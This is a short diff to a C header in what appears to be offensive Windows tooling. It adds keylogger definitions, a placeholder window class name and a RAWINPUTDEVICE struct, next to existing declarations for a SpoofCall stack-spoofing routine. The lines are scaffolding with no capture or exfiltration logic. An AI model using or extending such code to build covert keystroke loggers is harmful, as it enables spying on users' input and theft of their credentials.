@@ -34,6 +34,19 @@ typedef BindingFlags  IBindingFlags;
     } \
 }
 
+
+// definitions for Keylogger
+#define KEYLOG_CLASS_NAME L"KeyloggerClass" //need to change later
+
+
+typedef struct tagRAWINPUTDEVICE {
+    USHORT usUsagePage; 
+    USHORT usUsage;     
+    DWORD dwFlags;
+    HWND hwndTarget;    
+} RAWINPUTDEVICE, *PRAWINPUTDEVICE, *LPRAWINPUTDEVICE;
+
+
 EXTERN_C PVOID StartPtr();
 EXTERN_C PVOID EndPtr();
 EXTERN_C PVOID SpoofCall( ... );
